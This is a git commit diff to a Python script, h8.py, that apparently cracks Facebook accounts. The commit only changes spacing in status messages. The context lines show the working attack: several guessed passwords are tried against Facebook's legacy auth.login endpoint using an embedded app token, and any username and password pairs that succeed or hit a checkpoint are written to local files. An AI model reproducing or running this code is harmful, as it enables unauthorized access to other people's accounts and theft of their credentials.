be2f490f575c907385d3fe3a91297a1f2a7cbec7
robiulxx <86838778+robiulxx@users.noreply.github.com>
2021-08-31 08:47:01 -0900

    Update h8.py

--- h8.py
+++ h8.py
@@ -249,14 +249,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[ RobiulBD=OK]' + k + c + user + ' ☞ ' + pass1																				
+				print '\x1b[1;92m[RobiulBD=OK]' + k + c + user + ' ☞ ' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;95m[ RobiulBD=CP]' + k + c + user + ' ☞ ' + pass1
+					print '\x1b[1;95m[RobiulBD=CP]' + k + c + user + ' ☞ ' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -266,14 +266,14 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;92m[ RobiulBD=OK]' + k + c + user + ' ☞ ' + pass2                            											
+		                        	print '\x1b[1;92m[RobiulBD=OK]' + k + c + user + ' ☞ ' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;95m[ RobiulBD=CP]' + k + c + user + ' ☞ ' + pass2
+							print '\x1b[1;95m[RobiulBD=CP]' + k + c + user + ' ☞ ' + pass2
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -283,14 +283,14 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[ RobiulBD=OK]' + k + c + user + ' ☞ ' + pass3
+								print '\x1b[1;92m[RobiulBD=OK]' + k + c + user + ' ☞ ' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;95m[ RobiulBD=CP]' + k + c + user + ' ☞ ' + pass3
+									print '\x1b[1;95m[RobiulBD=CP]' + k + c + user + ' ☞ ' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
